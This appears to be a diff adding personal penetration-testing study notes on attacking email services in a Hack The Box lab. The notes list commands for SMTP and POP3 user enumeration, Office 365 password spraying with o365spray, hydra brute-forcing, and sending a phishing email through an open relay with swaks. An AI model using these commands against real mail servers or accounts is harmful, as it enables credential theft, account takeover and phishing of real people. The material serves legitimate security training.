@@ -1,0 +1,71 @@
+ENUMERATION!
+It's a little bit complicated, since enum involves multiple servers, ports, and services.
+
+
+DNS MX records can help:
+host -t MX inlanefreight.htb
+
+dig mx inlanefreight.htb | grep "MX" | grep -v ";"
+
+then if you find an MX record, you can check for the IP:
+host -t A mail1.inlanefreight.htb
+
+
+
+SMTP AUTHENTICATION
+VRFY Command:
+(this verifies a user exists)
+telnet <target-ip> <target-port>
+VRFY root
+VRFY www-data
+VRFY new-user
+
+EXPN command:
+(this is similar to VRFY, but can be used on 'groups?')
+EXPN john
+EXPN support-team
+
+RCPT TO command:
+(identifies the recipient of an email message)
+MAIL FROM:test@htb.com
+RCPT TO: julio
+RCPT TO: kate
+RCPT TO: john
+(will respond with Recipient ok if valid)
+
+POP3 AUTHENTICATION
+USER command:
+(verifies a user exists, but on the POP3 protocol)
+telnet <target-ip> <target-port>
+USER julio
+USER john
+
+
+
+ENUMERATING USERS WITH SMTP-USER-ENUM
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+
+CLOUD ENUMERATION WITH O365SPRAY
+(validates that the target is using Office 365)
+python3 o365spray.py --validate --domain msplaintext.xyz
+
+(attempts to identify usernames)
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   
+
+(password spraying)
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
+
+ENUMERATINGS USERS ON POP3
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+Sometimes you have to use the full username@ for the -l!
+(remember to make sure that you take the output of the usernames LITERALLY, so if it says marlin, it's marlin, and if it's marlin@inlanefreight.htb, then I guess that's the full username.)
+hydra -l marlin@inlanefreight.htb -P passlist.txt -f 10.10.110.20 pop3
+
+
+CHECKING IF SMTP-OPEN-RELAY IS AVAILABLE:
+nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
+
+(if available, then use any mail client to connect to the mail server)
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
